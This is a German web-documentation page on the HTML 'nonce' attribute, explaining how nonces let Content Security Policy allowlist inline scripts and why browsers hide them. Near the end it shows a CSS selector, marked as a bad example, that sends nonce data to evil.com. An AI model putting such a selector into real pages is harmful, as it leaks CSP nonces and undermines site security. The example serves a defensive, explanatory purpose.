---
title: nonce
slug: Web/HTML/Global_attributes/nonce
l10n:
  sourceCommit: 4d929bb0a021c7130d5a71a4bf505bcb8070378d
---

{{HTMLSidebar("Global_attributes")}}

Das **`nonce`** [Globale Attribut](/de/docs/Web/HTML/Global_attributes)
ist ein Inhaltsattribut, das eine kryptografische Zufallszahl definiert ("number used once"), die von der
[Content Security Policy (CSP)](/de/docs/Web/HTTP/Guides/CSP) verwendet werden kann, um zu bestimmen, ob ein bestimmter Datenabruf
für ein bestimmtes Element erlaubt wird oder nicht.

## Beschreibung

Das `nonce` Attribut ist nützlich, um spezifische Elemente, wie zum Beispiel ein bestimmtes Inline-Skript oder Style-Elemente, auf die Zulassungsliste zu setzen.
Es kann Ihnen helfen, die Verwendung der [CSP](/de/docs/Web/HTTP/Guides/CSP) Anweisung `unsafe-inline` zu vermeiden, die _alle_ Inline-Skripte oder Styles auf die Zulassungsliste setzen würde.

> [!NOTE]
> Nutzen Sie `nonce` nur in Fällen, in denen Sie keine andere Möglichkeit haben, unsichere Inline-Skript-
> oder Stil-Inhalte zu verwenden. Wenn Sie `nonce` nicht benötigen, verwenden Sie es nicht. Wenn Ihr Skript statisch ist, könnten Sie stattdessen einen CSP-Hash verwenden.
> (Siehe Nutzungshinweise zu [unsicheren Inline-Skripten](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src#unsafe_inline_script).)
> Versuchen Sie stets, die [CSP](/de/docs/Web/HTTP/Guides/CSP) Schutzmechanismen voll auszunutzen und vermeiden Sie Nonces oder unsichere Inline-Skripte, wann immer möglich.

### Verwendung von nonce zur Zulassungsliste eines `<script>`-Elements

Es gibt einige Schritte, um ein Inline-Skript mit dem Nonce-Mechanismus auf die Zulassungsliste zu setzen:

#### Generierung von Werten

Von Ihrem Webserver aus generieren Sie eine zufällige, Base64-kodierte Zeichenkette mit mindestens 128 Bit Daten aus einem kryptografisch sicheren
Zufallszahlengenerator. Nonces sollten bei jedem Laden der Seite unterschiedlich generiert werden (Nonce nur einmal!). Zum Beispiel in Node.js:

```js
const crypto = require("crypto");
crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

#### Zulassungsliste für Inline-Script

Der auf Ihrem Backend-Code generierte Nonce sollte nun für das Inline-Skript verwendet werden, das Sie auf die Zulassungsliste setzen möchten:

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  // …
</script>
```

#### Senden eines Nonce mit einem CSP-Header

Schließlich müssen Sie den Nonce-Wert in einem
[`Content-Security-Policy`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy) Header senden
(präfixiert mit `nonce-`):

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

### Zugriff auf Nonces und Nonce-Verbergung

Aus Sicherheitsgründen wird das `nonce` Inhaltsattribut verborgen (ein leerer String wird zurückgegeben).

```js example-bad
script.getAttribute("nonce"); // returns empty string
```

Die [`nonce`](/de/docs/Web/API/HTMLElement/nonce) Eigenschaft ist der einzige Weg, um auf Nonces zuzugreifen:

```js example-good
script.nonce; // returns nonce value
```

Das Verbergen von Nonces hilft, Angreifer daran zu hindern, Nonce-Daten über Mechanismen zu exfiltrieren, die Daten aus Inhaltsattributen erfassen können, wie in diesem Fall:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`HTMLElement.nonce`](/de/docs/Web/API/HTMLElement/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP)
- CSP: [`script-src`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src)
